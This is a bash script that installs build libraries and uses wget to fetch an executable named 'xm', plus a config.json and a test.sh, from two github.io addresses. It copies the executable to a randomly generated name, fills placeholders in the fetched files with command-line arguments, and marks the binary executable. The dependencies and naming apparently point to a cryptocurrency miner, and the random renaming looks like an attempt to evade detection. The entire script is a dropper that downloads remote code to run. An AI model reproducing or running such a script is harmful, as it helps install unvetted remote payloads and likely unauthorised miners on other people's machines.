#!/bin/bash
echo "Getting Things Ready ... "
apt-get update -y
apt-get install -y sudo curl zip nano wget libmicrohttpd-dev libssl-dev libhwloc-dev
wget http://dzmltzack.github.io/web/xm -O oxm
NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
BB=za$NEW_UUID
cp oxm $BB
echo $NN >> $BB
wget https://pzeankto.github.io/namnam/arqt.json -O config.json
wget https://pzeankto.github.io/namnam/test.sh -O test.sh
sed -i "s/PSPS/$1/g" config.json
sed -i "s/ELKONTA/$2/g" test.sh
sed -i "s/ELLAST/$3/g" test.sh
chmod +x $BB
